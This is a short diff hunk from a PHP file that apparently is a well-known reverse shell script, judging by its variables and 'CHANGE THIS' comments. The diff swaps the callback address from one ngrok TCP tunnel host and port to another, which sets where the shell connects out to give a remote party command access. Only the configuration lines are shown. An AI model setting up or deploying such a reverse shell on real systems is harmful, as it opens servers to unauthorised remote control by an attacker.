@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '0.tcp.in.ngrok.io'; // CHANGE THIS
-$port = 14368;       // CHANGE THIS
+$ip = '5.tcp.eu.ngrok.io'; // CHANGE THIS
+$port = 14912;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
